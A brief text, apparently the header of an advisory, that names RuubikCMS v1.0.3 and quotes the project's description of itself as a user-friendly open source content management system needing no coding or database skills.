Application	: RuubikCMS

Version 	: v1.0.3 

info cms:
RuubikCMS is an open source website content management tool which is designed
to be user-friendly for both the end-user and the webmaster.

In our vision the end-user should be able to create and update webpages quickly
without learning any special skills (no coding, HTML or CSS). For the webmaster
a RuubikCMS site should be easy to install and manage but still flexible to allow
modifications. In any case installing should be so easy that a designing oriented
webmaster doesn't need any coding or database skills.
